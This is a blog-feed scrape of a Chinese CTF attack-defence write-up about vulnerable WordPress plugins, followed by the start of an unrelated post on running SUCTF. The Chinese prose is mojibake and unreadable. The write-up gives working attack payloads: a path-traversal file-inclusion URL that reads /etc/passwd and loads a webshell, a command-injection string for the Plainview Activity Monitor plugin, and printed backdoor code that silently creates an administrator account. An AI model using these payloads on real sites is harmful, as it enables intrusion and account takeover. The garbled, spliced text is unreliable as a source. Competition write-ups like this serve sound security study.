è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨wpscanæ¥çœ‹çœ‹\n./wpscan --url http://localhost/wordpress -e vp\t//æŸ¥æ‰¾æœ‰æ¼æ´çš„plugin site-editor é¦–å…ˆçœ‹site-editor\n \nå¯ä»¥ä»å›¾ä¸­çœ‹å‡ºï¼Œä¸»è¦æ˜¯ä¸ªæ–‡ä»¶åŒ…å«çš„æ¼æ´ã€‚\nè¯¦ç»†å‚è€ƒ[CVE-2018-7422] Local File Inclusion (LFI) vulnerability in WordPress Site Editor Plugin\nhttp://\u0026lt;host\u0026gt;/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd è¿™é‡Œåšä¸ªç®€è¦çš„åˆ†æï¼Œç‰ˆæœ¬å¯èƒ½ä¸CVEä¸­æåˆ°çš„ä¸åŒï¼Œå¤šäº†str_replaceçš„è¿‡æ»¤\u0026hellip;ä½†æ˜¯è¿™ä¸ªå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨\u0026hellip;\nif( isset( $_REQUEST[\u0026#39;ajax_path\u0026#39;] ) ){ $ajax_path=$_REQUEST[\u0026#39;ajax_path\u0026#39;]; $ajax_path = str_replace(\u0026#39;../\u0026#39;,\u0026#39;\u0026#39;,$ajax_path); require_once $ajax_path; } å¯ä»¥çœ‹åˆ°è¿™é‡Œå¯ä»¥ç›´æ¥åŒ…å«/æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå¯ä»¥ç”¨..././è·³åˆ°ä¸Šå±‚ç›®å½•ã€‚\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹payloadå»åŒ…å«ä¹‹å‰çš„ä¸€å¥è¯æœ¨é©¬\nhttp://localhost/wordpress-awd/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=..././..././..././..././..././..././..././wp-includes/pomo/tp.php  \ngift-voucher å¦ä¸€ä¸ªwpscanæ‰«åˆ°çš„æ’ä»¶æ˜¯gift-voucher\n \nå¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸ªç›²æ³¨çš„æ´ï¼Œè¯¦ç»†å‚è€ƒWordPress Plugin Gift Voucher 1.0.5 - (Authenticated) \u0026lsquo;template_id\u0026rsquo; SQL Injection\nç”¨sqlmapæ‰«äº†ä¸€ä¸‹\n \nå¾—åˆ°adminçš„å¯†ç ï¼Œå¦‚æœå­—å…¸å¥½çš„è¯ï¼Œå¯ä»¥å¿«ä¸€äº›ã€‚\n \nLocalize My Post è¿™ä¸ªwpscanç«Ÿç„¶æ²¡æœ‰æ‰«å‡ºæ¥ï¼Œè¯¦ç»†å‚è€ƒWordPress Plugin Localize My Post 1.0 - Local File Inclusion\n\u0026lt;?php //Include WP base to have the basic WP functions include_once($_SERVER[\u0026#39;DOCUMENT_ROOT\u0026#39;] . \u0026#34;/wp-blog-header.php\u0026#34;); //Set status 200 header //Include requested file if it exists if(isset($_REQUEST[\u0026#39;file\u0026#39;])){ $file=$_REQUEST[\u0026#39;file\u0026#39;]; $file = str_replace(\u0026#39;./\u0026#39;,\u0026#39;\u0026#39;,$file); header(\u0026#39;HTTP/1.1 200 OK\u0026#39;); include($file); } è¿™é‡Œè·Ÿä¸Šé¢é‚£ä¸ªæ–‡ä»¶åŒ…å«ç±»ä¼¼ï¼Œå¯ä»¥ç”¨...//æ¥è®¿é—®ä¸Šçº§ç›®å½•\n \nplainview-activity-monitor è¿™ä¸ªä¹Ÿæ˜¯wpscanæ²¡æœ‰æ‰«å‡ºæ¥çš„æ¼æ´æ’ä»¶ï¼Œè€Œä¸”æ˜¯ä¸ªRCEï¼Œä½†æ˜¯åˆ©ç”¨æ¡ä»¶æ˜¯éœ€è¦ç™»å½•åˆ°åå°æ‰å¯ä»¥ã€‚è¯¦ç»†å‚è€ƒWordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection\n/** @brief\tVarious tools. @since\t2014-05-04 10:41:51 **/ \u0026lt;?php public function admin_menu_tools(){ $r = \u0026#39;\u0026#39;; // IP converter  $form = $this-\u0026gt;form2(); $fs = $form-\u0026gt;fieldset(\u0026#39;fs_ip\u0026#39;); $fs-\u0026gt;legend-\u0026gt;label_(\u0026#39;IP tools\u0026#39;); $fs-\u0026gt;text(\u0026#39;ip\u0026#39;) -\u0026gt;label_(\u0026#39;IP or integer\u0026#39;) -\u0026gt;required() -\u0026gt;size(15, 15); $fs-\u0026gt;markup(\u0026#39;markup_convert\u0026#39;) -\u0026gt;markup(\u0026#39;The convert button will convert the IP address or integer to its equivalent integer or IP address.\u0026#39;); $fs-\u0026gt;secondary_button(\u0026#39;convert\u0026#39;) -\u0026gt;value(\u0026#39;Convert\u0026#39;); $fs-\u0026gt;markup(\u0026#39;markup_lookup\u0026#39;) -\u0026gt;markup(\u0026#39;The lookup button will try to resolve an IP address to a host name. If dig is installed on the webserver it will also be used for the lookup.\u0026#39;); $fs-\u0026gt;secondary_button(\u0026#39;lookup\u0026#39;) -\u0026gt;value(\u0026#39;Lookup\u0026#39;); if ($form-\u0026gt;is_posting()) { $form-\u0026gt;post()-\u0026gt;use_post_value(); $ip = $fs-\u0026gt;input(\u0026#39;ip\u0026#39;)-\u0026gt;get_filtered_post_value(); $long = $ip; $is_ip = (strpos($ip, \u0026#39;.\u0026#39;) !== false); if ($is_ip) $long = ip2long($ip); else $ip = long2ip($ip); if ($fs-\u0026gt;input(\u0026#39;convert\u0026#39;)-\u0026gt;pressed()) { if ($is_ip) $message = $this-\u0026gt;p_(\u0026#39;The integer value of this IP address %s is \u0026lt;strong\u0026gt;%s\u0026lt;/strong\u0026gt;.\u0026#39;, $ip, $long); else $message = $this-\u0026gt;p_(\u0026#39;The IP address of the integer %s is \u0026lt;strong\u0026gt;%s\u0026lt;/strong\u0026gt;.\u0026#39;, $long, $ip); } if ($fs-\u0026gt;input(\u0026#39;lookup\u0026#39;)-\u0026gt;pressed()) { $address = gethostbyaddr($ip); $message = $this-\u0026gt;p_(\u0026#39;The IP address %s resolves to \u0026lt;strong\u0026gt;%s\u0026lt;/strong\u0026gt;.\u0026#39;, $ip, $address); $output = \u0026#39;\u0026#39;; exec(\u0026#39;dig -x \u0026#39; . $ip, $output); if (count($output) \u0026gt; 0) { $output = array_filter($output); $output = implode(\u0026#34;\\n\u0026#34;, $output); $message .= $this-\u0026gt;p_(\u0026#39;Output from dig: %s\u0026#39;, $this-\u0026gt;p($output)); } } $this-\u0026gt;message($message); } $r .= $form-\u0026gt;open_tag(); $r .= $form-\u0026gt;display_form_table(); $r .= $form-\u0026gt;close_tag(); echo $r; } å…³é”®ä»£ç :\nif ($form-\u0026gt;is_posting()) { $form-\u0026gt;post()-\u0026gt;use_post_value(); $ip = $fs-\u0026gt;input(\u0026#39;ip\u0026#39;)-\u0026gt;get_filtered_post_value(); $long = $ip; $is_ip = (strpos($ip, \u0026#39;.\u0026#39;) !== false); if ($is_ip) $long = ip2long($ip); else $ip = long2ip($ip); if ($fs-\u0026gt;input(\u0026#39;convert\u0026#39;)-\u0026gt;pressed()) { if ($is_ip) $message = $this-\u0026gt;p_(\u0026#39;The integer value of this IP address %s is \u0026lt;strong\u0026gt;%s\u0026lt;/strong\u0026gt;.\u0026#39;, $ip, $long); else $message = $this-\u0026gt;p_(\u0026#39;The IP address of the integer %s is \u0026lt;strong\u0026gt;%s\u0026lt;/strong\u0026gt;.\u0026#39;, $long, $ip); } if ($fs-\u0026gt;input(\u0026#39;lookup\u0026#39;)-\u0026gt;pressed()) { $address = gethostbyaddr($ip); $message = $this-\u0026gt;p_(\u0026#39;The IP address %s resolves to \u0026lt;strong\u0026gt;%s\u0026lt;/strong\u0026gt;.\u0026#39;, $ip, $address); $output = \u0026#39;\u0026#39;; exec(\u0026#39;dig -x \u0026#39; . $ip, $output); if (count($output) \u0026gt; 0) { $output = array_filter($output); $output = implode(\u0026#34;\\n\u0026#34;, $output); $message .= $this-\u0026gt;p_(\u0026#39;Output from dig: %s\u0026#39;, $this-\u0026gt;p($output)); } } $this-\u0026gt;message($message); } è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°ï¼Œè¿™æ®µä»£ç é€šè¿‡ä»£ç æ‹¼æ¥çš„æ–¹å¼æ‰§è¡Œå‘½ä»¤ï¼Œå­˜åœ¨å‘½ä»¤æ‰§è¡Œçš„æ¼æ´ã€‚\nexec( \u0026#39;dig -x \u0026#39; . $ip, $output ); æ‰€ä»¥æˆ‘ä»¬è¦çœ‹çœ‹$ipæ˜¯å¦è¿‡æ»¤å®‰å…¨\né¦–å…ˆæ‹¿åˆ°ipï¼Œç„¶åç”¨strpos()å‡½æ•°æ£€æŸ¥æ˜¯å¦æœ‰.å‡ºç°ï¼Œè¿™é‡Œæˆ‘ä»¬éšä¾¿ç”¨ä¸€ä¸ªåŸŸåå°±å¯ä»¥ç»•è¿‡äº†ï¼Œè®©$is_ipä¸ºTrue\n$ip = $fs-\u0026gt;input( \u0026#39;ip\u0026#39; )-\u0026gt;get_filtered_post_value(); $long = $ip; $is_ip = ( strpos( $ip, \u0026#39;.\u0026#39; ) !== false ); if ( $is_ip ) $long = ip2long( $ip ); else $ip = long2ip( $ip ); å†çœ‹ip2long\nReturn Values Returns the host name on success, the unmodified ip_address on failure, or FALSE on malformed input. æ‰€ä»¥è¿™é‡Œ$long = false\næˆ‘ä»¬ä¼ ä¸ä¼ convertå‚æ•°éƒ½æ— æ‰€è°“ï¼Œå› ä¸ºéƒ½å¯ä»¥å¾€ä¸‹æ‰§è¡Œã€‚ä½†æ˜¯ä¸ºäº†è§¦å‘ä»£ç æ‰§è¡Œï¼Œæˆ‘ä»¬å¿…é¡»å¾—ä¼ å…¥lookupå‚æ•°\nif ( $fs-\u0026gt;input( \u0026#39;lookup\u0026#39; )-\u0026gt;pressed() ) { $address = gethostbyaddr( $ip ); $message = $this-\u0026gt;p_( \u0026#39;The IP address %s resolves to \u0026lt;strong\u0026gt;%s\u0026lt;/strong\u0026gt;.\u0026#39;, $ip, $address ); $output = \u0026#39;\u0026#39;; exec( \u0026#39;dig -x \u0026#39; . $ip, $output ); if ( count( $output ) \u0026gt; 0 ) { $output = array_filter( $output ); $output = implode( \u0026#34;\\n\u0026#34;, $output ); $message .= $this-\u0026gt;p_( \u0026#39;Output from dig: %s\u0026#39;, $this-\u0026gt;p( $output ) ); } } å…¶å®å…¶ä»–çš„åˆ†å¸ƒåˆ†æéƒ½æ— æ‰€è°“ï¼Œåªè¦è¿›å…¥äº†è¿™ä¸ªifï¼Œå°±å¯ä»¥ç›´æ¥æ‰§è¡Œæˆ‘ä»¬ä¼ å…¥çš„$ipäº†ï¼Œå¹¶ä¸éœ€è¦å…¶ä»–å¤šä½™çš„æ“ä½œã€‚\næ‰€ä»¥è¿™é‡Œå¯ä»¥è¯´æ˜¯æ²¡æœ‰ä»»ä½•è¿‡æ»¤çš„ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œåªè¦ä¼ å…¥ä¸€ä¸ªå¸¦æœ‰.çš„åŸŸåå°±å¯ä»¥ç»•è¿‡å‰é¢å”¯ä¸€ä¸€å¤„å¯¹ipçš„æ£€æµ‹äº†ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªpayload:\nip=baidu.com%7C%20ls\u0026amp;lookup  \nå¾—åˆ°æ‰§è¡Œç»“æœã€‚\nFunction.php å›è¿‡å¤´æ¥ï¼Œæˆ‘ä»¬å†çœ‹çœ‹è¿˜æœ‰æ²¡æœ‰è·Ÿå®˜æ–¹æ–‡ä»¶å…¶ä»–ä¸åŒçš„æ–‡ä»¶ã€‚é™¤äº†MACäº§ç”Ÿçš„.DS_Storeæ–‡ä»¶ã€._wp-config.phpç¼–è¾‘ä¸´æ—¶æ–‡ä»¶ã€wp-config.phpé…ç½®æ–‡ä»¶ï¼Œå‰©ä¸‹çš„å°±æ˜¯function.phpäº†\n \næˆ‘ä»¬å¯¹æ¯”å¾—åˆ°æ¯”èµ›å¤šå‡ºäº†è¿™ä¹ˆä¸€å¤„ä»£ç :\nadd_action(\u0026#39;wp_head\u0026#39;, \u0026#39;wploop_users\u0026#39;); function wploop_users() { if ($_POST[\u0026#39;users\u0026#39;] == \u0026#39;knockknock\u0026#39;) { require \u0026#39;wp-includes/registration.php\u0026#39;; if (!username_exists(\u0026#39;username\u0026#39;)) { $user_id = wp_create_user(\u0026#39;username\u0026#39;, \u0026#39;passpass\u0026#39;); $user = new WP_User($user_id); $user-\u0026gt;set_role(\u0026#39;administrator\u0026#39;); } } } ä»£ç ç®€å•æ˜“æ‡‚ï¼Œå°±æ˜¯ä¼ å…¥users=knockknockå°±åˆ›å»ºäº†ä¸€ä¸ªç”¨æˆ·åä¸ºusernameå¯†ç ä¸ºpasspassçš„æœ‰ç®¡ç†å‘˜æƒé™çš„è¿™ä¹ˆä¸€ä¸ªç”¨æˆ·ã€‚\né¸¡è‚‹ï¼Ÿ ä¸€å¼€å§‹å¤ç›˜çš„æ—¶å€™æˆ‘ä¹Ÿæ²¡ææ‡‚ä¸ºå•¥ä¼šå¤šå‡ºè¿™ä¹ˆä¸€æ®µä»£ç ï¼Œæ„Ÿè§‰å¾ˆé¸¡è‚‹ï¼Œæ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ç‚¹ã€‚\nå› ä¸ºæˆ‘ä»¬å·²çŸ¥çš„ç®¡ç†å‘˜å¯ä»¥æ“ä½œçš„ç‚¹\n ä¸Šä¼ mediaæ–‡ä»¶ ç¼–è¾‘æ¨¡ç‰ˆï¼Œæ”¹æˆä¸€å¥è¯æœ¨é©¬  ä½†æ˜¯è¿™ä¸¤ä¸ªç‚¹éƒ½å› ä¸ºwebç›®å½•ä¸å¯å†™è€Œå¤±å»äº†ä½œç”¨ï¼Œæ‰€ä»¥è¿™ä¸ªå¢åŠ ä¸€ä¸ªç®¡ç†å‘˜ä»¥åŠå‰é¢gift-voucherçš„ç›²æ³¨æ¼æ´å°±çœ‹èµ·æ¥æœ‰äº›é¸¡è‚‹äº†ã€‚æ‰€ä»¥ä¸€å¼€å§‹æˆ‘æ‰‹æ”¹çš„åå¤šä¸ªé˜Ÿçš„ç®¡ç†å‘˜å¯†ç å¹¶æ²¡æœ‰å¾ˆå¥½åœ°ç”¨èµ·æ¥ï¼Œå¯¼è‡´äº†æ—¶é—´çš„æµªè´¹ã€‚\nä¸è¿‡åæ¥æˆ‘å†™åˆ°plainview-activity-monitoræ’ä»¶æ¼æ´åˆ©ç”¨çš„æ—¶å€™ï¼Œå‘ç°è¿™ä¸ªåˆ©ç”¨æ¡ä»¶éœ€è¦ç™»å½•åˆ°åå°ï¼Œæˆ‘çŒœæƒ³è¿™é‡Œå¢åŠ ç®¡ç†å‘˜ä»¥åŠç›²æ³¨æ¼æ´éƒ½æ˜¯ä¸ºäº†é‚£ä¸ªæ’ä»¶çš„RCEæ¼æ´å‡†å¤‡çš„å§ã€‚\næ€»ç»“ åæ§½ è¿™æ¬¡æ¯”èµ›æ”¶è·è¿˜æ˜¯æœ‰çš„ã€‚åªä¸è¿‡ä¸ç»™è¿å¤–ç½‘æ¯”è¾ƒå‘ï¼Œè€Œä¸”è§£é¢˜èµ›æ”¾é¢˜æ—¶é—´ä¹Ÿä¸åˆç†ï¼ŒWebæœ€åä¸¤é“é¢˜éƒ½æ˜¯æœ€åä¸€å°æ—¶æ‰æ”¾çš„ï¼Œè€Œä¸”è€ƒçš„phpjmä¹Ÿæ¯”è¾ƒå‘\u0026hellip;è€Œä¸”Miscä¼°è®¡æ˜¯è¿™åœºæ¯”èµ›æœ€å¤§çš„æ§½ç‚¹äº†ï¼Œæˆ‘æ²¡æœ‰ä»å¤´åˆ°å°¾éƒ½åœ¨åšMiscï¼Œä½†æ˜¯ä¸¤ä¸ªMiscï¼Œéƒ½æ˜¯é çˆ†ç ´å‡ºæ¥çš„zipå‹ç¼©åŒ…å¯†ç ï¼Œè·Ÿä¹‹å‰é¢˜ç›®æç¤ºçš„å¯†ç å‘€ä»€ä¹ˆçš„å®Œå…¨æ²¡æœ‰å…³ç³»ï¼Œæˆ‘è®°å¾—å…¶ä¸­ä¸€ä¸ªå¯†ç æ˜¯qï¼Œå¦ä¸€ä¸ªå¯†ç æ˜¯ä¸ç»™å‡ºçš„å¯†ç æš—ç¤º0x120å®Œå…¨ä¸ä¸€æ ·çš„0x110\u0026hellip;è¿™é‡Œå‘äº†æˆ‘ä»¬å¾ˆä¹…\u0026hellip;\nAWDå°±ä¸æƒ³è¯„ä»·äº†ï¼Œpwnåªæ”»ä¸é˜²ï¼Œèµ›åå¬è¯´å¯ä»¥é€šè¿‡åœ¨è‡ªå·±çš„pwnæœåŠ¡ä¸Šæ‰“forkbombèº²è¿‡å…¶ä»–é˜Ÿçš„æ”»å‡»ã€‚æ•´ä¸ªæ¯”èµ›å¯ä»¥è¯´æ˜¯æ²¡æœ‰ä»»ä½• checkï¼Œä¸»åŠæ–¹å¯¹get flagçš„æ–¹å¼ä¹Ÿæ²¡æœ‰åšè¯¦ç»†è¯´æ˜ï¼Œä¹Ÿå¬è¯´æœ‰ä¸ªé˜Ÿæœ€åä¸€å°æ—¶æ‰çŸ¥é“æ€ä¹ˆget flagã€‚å¹³å°å¡çš„ä¸€æ‰¹\u0026hellip;å…¬å‘Šè¿˜è¯´ä¸èƒ½ç”¨è„šæœ¬æäº¤flagï¼Œå“ã€‚åˆ°å¤„éƒ½æ˜¯æ§½ç‚¹ã€‚æ„Ÿè§‰ä¸»åŠæ–¹å‡†å¤‡çš„ä¸æ˜¯å¾ˆå……åˆ†ã€‚\nè‡ªæˆ‘åçœ åŒæ—¶æœ¬æ¬¡æ¯”èµ›ï¼Œä»æŠ€æœ¯çš„è§’åº¦æ¥çœ‹ï¼Œä¸»è¦åœ¨AWDæ–¹é¢ï¼Œæˆ‘æ„Ÿè§‰è‡ªå·±å‡†å¤‡çš„è¿˜æ˜¯ä¸å¤Ÿå……åˆ†ï¼Œå³ä½¿ç»™äº†payloadï¼Œæˆ‘ä¹Ÿæ²¡æœ‰ç¬¬ä¸€æ—¶é—´åˆ©ç”¨èµ·æ¥å»å¾—åˆ†ï¼Œå¯¼è‡´è‡ªå·±ä¸¢äº†å¾ˆå¤šå¾ˆå¤šåˆ†æ•°ã€‚ä¸»è¦ä¹Ÿæ˜¯è‡ªå·±å¯¹pythonæ²¡æœ‰è¶³å¤Ÿçš„ç†Ÿæ‚‰å§ï¼Œè¢«requestsåº“è‡ªåŠ¨urlencodeå‘äº†æ¯”è¾ƒä¹…ã€‚è™½ç„¶æ”¶è—äº†å‡ ä¸ªå¤§å¸ˆå‚…çš„AWDå·¥å…·æ¡†æ¶ï¼Œä½†æ˜¯æ²¡æœ‰ç†Ÿæ‚‰åˆ©ç”¨ï¼Œä»¥è‡³äºèµ›åœºéƒ½æ˜¯è‡ªå·±ç°å†™çš„è„šæœ¬ï¼Œå¹¶æ²¡æœ‰å°†å‡†å¤‡çš„è„šæœ¬åˆ©ç”¨èµ·æ¥ã€‚\nä¸‹æ¬¡çº¿ä¸‹èµ›å¿…å¤‡çš„è„šæœ¬ï¼Œå…¶ä¸€æ˜¯è‡ªåŠ¨æäº¤flagï¼Œä¸»è¦æ˜¯æ­£åˆ™é‚£é‡Œï¼›å…¶äºŒæ˜¯get flagçš„è„šæœ¬ï¼Œä¾æ®ç›®å‰ä¸»æµçš„æ”»é˜²å½¢å¼ï¼Œè¦å‡†å¤‡ä¸¤ç±»ï¼Œä¸€ç±»æ˜¯flagä»¥æ–‡ä»¶çš„å½¢å¼å­˜æ”¾åœ¨é€‰æ‰‹æœºå™¨ä¸Šçš„ï¼Œå¦ä¸€ç±»å°±æ˜¯åœ¨é€‰æ‰‹æœºå™¨ä¸Šé€šè¿‡curlè¯·æ±‚å¾—åˆ°flagçš„ï¼Œç›®å‰æˆ‘æ‰“è¿‡çš„æ¯”èµ›å°±åˆ†ä¸ºè¿™ä¸¤ç±»ã€‚\n ä»Šæ™šè¿˜çœ‹äº†ç™½å¸½100æ¹–æ¹˜æ¯çº¿ä¸‹èµ›çš„è®°å½•ï¼Œæ„Ÿè§‰è‡ªå·±çš„å¯¹äºçº¿ä¸‹èµ›çš„ç†è§£è¿˜æ˜¯ä¸å¤Ÿæ·±åˆ»ã€‚æ‰“ç®—æœ‰ç©ºæ›´ä¸€ç¯‡AWDçš„ä¸ªäººæ€»ç»“ã€‚æœ¬æ¬¡å°è®°å°±è¿™æ ·å§ã€‚\n","date":"2018-11-25T21:47:28Z","permalink":"https://blog.zeddyu.info/2018/11/25/%E5%8E%A6%E5%A4%A7%E6%97%85%E6%B8%B8%E5%B0%8F%E8%AE%B0/","title":"å¦å¤§æ—…æ¸¸å°è®°"},{"content":"SUCTFäº”æ ¡è”åˆæ‹›æ–°èµ›å·²ç»è¿‡å»å‡ å¤©äº†ã€‚ç°åœ¨ä»ä¸»åŠæ–¹çš„è§’åº¦æ¥å†™å†™æˆ‘ç¬¬ä¸€æ¬¡åŠæ¯”èµ›æ•´ä¸ªè¿‡ç¨‹å§\u0026hellip;\né¦–å…ˆæœ¬æ¬¡æ¯”èµ›æ˜¯æ±Ÿè‹é«˜æ ¡ä¿¡æ¯å®‰å…¨è”ç›ŸSUå†…ä¸œå—å¤§å­¦ã€å—äº¬èˆªç©ºèˆªå¤©å¤§å­¦ã€å—äº¬ç†å·¥å¤§å­¦ã€ä¸‰æ±Ÿå­¦é™¢ã€é‡‘é™µç§‘æŠ€å­¦é™¢äº”æ ¡è”åˆä¸¾åŠçš„é˜Ÿå†…æ‹›æ–°èµ›ï¼ŒåŸæœ¬è®¡åˆ’æ˜¯å‡ºé¢˜ç»™èŒæ–°åšçš„ï¼Œç»“æœåˆ°åé¢æ˜¯é¢˜ç›®è¶Šæ¥è¶Šéš¾2333\u0026hellip;æ„Ÿè§‰å†…éƒ¨å‡ºé¢˜ä¹Ÿå½¢æˆäº†ä¸€å®šçš„ç«äº‰ï¼Œç„¶åç»“æœå°±ä¸æäº†ï¼Œå˜æˆäº†å¤§ä½¬å± æ¦œèµ›ã€‚\næ•°æ® æœ¬æ¬¡æ¯”èµ›ç”±äºæœ€åæ”¾çš„è°ƒæŸ¥é—®å·ï¼Œè€Œä¸”æ”¶é›†åˆ°çš„è°ƒæŸ¥é—®å·è¿œè¿œè¾¾åˆ°ç­¾åˆ°é¢˜å¾—åˆ†äººæ•°ï¼Œå§‘ä¸”ç”¨æ¥åšä¸ªå¤§æ¦‚çš„åˆ†æå§ã€‚\né¦–å…ˆæ˜¯æœ¬æ¬¡å‚èµ›äººæ•°ï¼Œæ³¨å†Œäººæ•°è¾¾åˆ°äº†463ä¸ªé˜Ÿï¼Œæœ€åè°ƒæŸ¥é—®å·å¡«å†™äººæ•°ä¸º81ä¸ªé˜Ÿã€‚  izikeH.md.png  äº”ä¸ªå­¦æ ¡çš„å­¦æ ¡æ•°æ®å°±ä¸åˆ†æäº†ï¼Œå…¶ä¸­å…¶ä»–å­¦æ ¡å åˆ°äº†242ä¸ªé˜Ÿï¼ŒåŸºæœ¬å˜æˆäº†åŠå…¬å¼€èµ›\u0026hellip;ä½†æ˜¯ç”±äºè¿˜æ˜¯æƒ³ä¿æŠ¤èŒæ–°ï¼Œå°±æ²¡æœ‰å˜æˆå®Œå…¨çš„å…¬å¼€èµ›ã€‚å¦åˆ™æˆ‘æ‹…å¿ƒä¼šè¢«æ—¥ç©¿\u0026hellip;\nç¬¬ä¸€å¤©å¼€èµ›çš„æƒ…å†µï¼Œç”±äºdockerç¯å¢ƒæ²¡é…ç½®å¥½ï¼Œå¯¼è‡´æœ‰ä¸€é¢˜pwnç›´æ¥è¢«æ‰“ç©¿äº†ï¼Œè¿˜è¢«æ”¹äº†flagï¼Œå¤§å¸ˆå‚…ä»¬çœŸçš„tql\u0026hellip;\nå¹´çº§æ‰€å æ¯”ä¾‹:  \næ¯”èµ›éš¾åº¦è°ƒæŸ¥ç»Ÿè®¡ï¼š  \næ—¶é—´å®‰æ’è°ƒæŸ¥ç»Ÿè®¡ï¼š  \næ¯”èµ›é¢˜ç›®è°ƒæŸ¥ç»Ÿè®¡ï¼š   æ¯”èµ›è¯„åˆ†è°ƒæŸ¥ç»Ÿè®¡(æ»¡åˆ†5åˆ†)ï¼š  \nä»¥ä¸Šæ•°æ®å‡ç”±æ¯”èµ›è°ƒæŸ¥é—®å·æ•°æ®ç»Ÿè®¡å¾—å‡ºã€‚\næ•´ä¸ªæ¯”èµ›å†æ—¶7å¤©ï¼Œä»2018/11/7 10:00:00 CST \u0026ndash; 2018/11/14 10:00:00 CSTï¼Œæ¯”èµ›æœŸé—´æ— æš‚åœï¼Œæ€»å…±æ”¾å‡ºé¢˜ç›®40é“é¢˜ï¼Œå…¶ä¸­pwnç±»7é“ï¼Œwebç±»14é“ï¼Œrevç±»8é“ï¼Œmiscç±»11é“ã€‚å¹¶æ²¡æœ‰æ— äººåšå‡ºçš„é¢˜ç›®ã€‚\nPreparation èµ·åˆè¦æSUCTFè”åˆæ‹›æ–°å…¶å®åœ¨å¼€å­¦åˆè²Œä¼¼å°±åœ¨SUå†…éƒ¨ç¾¤å°±æå‡ºæ¥äº†ï¼Œå› ä¸ºä¹‹å‰2016å¹´ä¹Ÿæœ‰è¿‡SUCTFç±»ä¼¼çš„è”åˆæ‹›æ–°èµ›ï¼Œå½“æ—¶å¾é™¢é•¿è¿˜æ˜¯ä½œä¸ºç¾å¥³å®¢æœçš„æ—¶å€™ï¼Œå½“æ—¶æˆ‘è¿˜å¯¹ç€å¾é™¢é•¿çš„å¤´åƒä¸€è„¸æ‡µé€¼çš„æ—¶å€™ã€‚\nç»“æœæ‹–åˆ°äº†10æœˆåº•è¿™æ ·ç„¶åæ‰çœŸæ­£æèµ·æ¥ï¼Œæ‹‰äº†å°ç¾¤ç„¶åå¼€å§‹è®¡åˆ’å‡ºé¢˜ï¼Œæˆ‘ä¹Ÿå°±æ‰å»æ‹‰èµåŠ©ã€‚äºæ˜¯ä¹ï¼Œé•¿äº­ã€èµ›å®åŒæ–¹è¿™è¾¹æˆ‘è°ˆçš„éƒ½ä¸æ˜¯å¾ˆé¡ºåˆ©ï¼Œä¸»è¦ä¹Ÿæ˜¯ç”±äºç¬¬ä¸€æ¬¡æ‹‰èµåŠ©ï¼Œæ²¡æœ‰å†™proposalï¼Œè¿›åº¦å°±ä¸€ç›´æ‹–æ…¢äº†æŒºå¤šçš„ï¼Œè€Œä¸”è·Ÿç™½å¸ˆå‚…é‚£è¾¹è¦æœºå™¨ä¹Ÿæ²¡æ²Ÿé€šé¡ºåˆ©ï¼Œå¹³å°è‡ªå·±ä¹Ÿå¹¶æ²¡æœ‰å¾ˆåŠæ—¶åœ°æ­å»ºèµ·æ¥ã€‚ç„¶ååœ¨è¿™ä¸€åˆ‡çš„åŸå› ä¹‹ä¸‹ï¼Œå¯¼è‡´äº†æ¯”èµ›åªèƒ½å¾€åæ¨äº†ä¸¤å¤©ï¼Œç”±åŸè®¡åˆ’çš„11/5æ¨åˆ°äº†11/7ï¼Œç”±äºè‡ªå·±ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡æ”¹CTFdï¼Œæ”¹çš„ä¹Ÿæ¯”è¾ƒæ…¢ï¼Œäºæ˜¯ä¹æˆ‘è®°å¾—ç›´åˆ°11/7æ—¥å‡Œæ™¨æˆ‘ä¾ç„¶è¿˜åœ¨æ”¹å¹³å°ã€‚\nç„¶å11/5æ™šä¸Šè¿™æ ·æ•´åˆé¢˜ç›®çš„æ—¶å€™ï¼Œç”±äºå„ä¸ªå¸ˆå‚…ç”¨å‡ºé¢˜æ¨¡ç‰ˆç†è§£ä¸å¤ªä¸€æ ·ï¼Œä¹Ÿæ€ªè‡ªå·±æ²¡æœ‰è®©å„ä½å¸ˆå‚…å¼€ä¸ªå°ä¼šå•¥çš„å¼ºè°ƒä¸€ä¸‹å‡ºé¢˜æ¨¡æ¿ï¼Œå¯¼è‡´æ•´åˆé¢˜ç›®çš„æ—¶å€™è¿˜æœ‰ä¸€å †æ ¼å¼ä¸å¯¹çš„é¢˜ç›®æ¨¡æ¿ï¼Œä¹Ÿç»Ÿç»Ÿå…¨éƒ¨éƒ½è®©å‡ºé¢˜äººè§„èŒƒäº†ï¼Œä¹Ÿè€—è´¹äº†ç™½å¸ˆå‚…ä¸å°‘ç²¾åŠ›å»æ”¹è¿™äº›é¢˜ç›®ã€‚\nè¿™é‡Œä¸»è¦è®°å½•ä¸‹æˆ‘è¿™è¾¹æ”¹CTFdçš„ç»å†å§ï¼Œæˆ‘çœ‹ç½‘ç»œä¸Šä¹Ÿå¹¶æ²¡æœ‰è¯¦ç»†çš„æ›´æ”¹CTFdçš„æµç¨‹ã€‚\nCTFd é¦–å…ˆæ˜ç¡®ä¸€ä¸‹è‡ªå·±çš„éœ€æ±‚ï¼š\n åœ¨æ³¨å†Œç•Œé¢æä¾›å­¦æ ¡çš„ä¸‹æ‹‰æ¡†é€‰æ‹© åœ¨å¾—åˆ†æ¦œæ˜¾ç¤ºå­¦æ ¡ æ›´æ”¹ä¸»é¡µæ·»åŠ èµåŠ©å•†ä¿¡æ¯  è™½ç„¶åªæ˜¯è¿™ç®€ç®€å•å•çš„å‡ ä¸ªéœ€æ±‚ï¼Œä¹ŸæŠŠæˆ‘è¿™ä¸ªä¸å¤ªç†Ÿæ‚‰flaskçš„äººæŠ˜è…¾äº†å¥½ä¸€é˜µå­ã€‚ æˆ‘çš„æ“ä½œç¯å¢ƒåœ¨Ubuntu 16.04ä¸‹å®Œæˆçš„ã€‚ 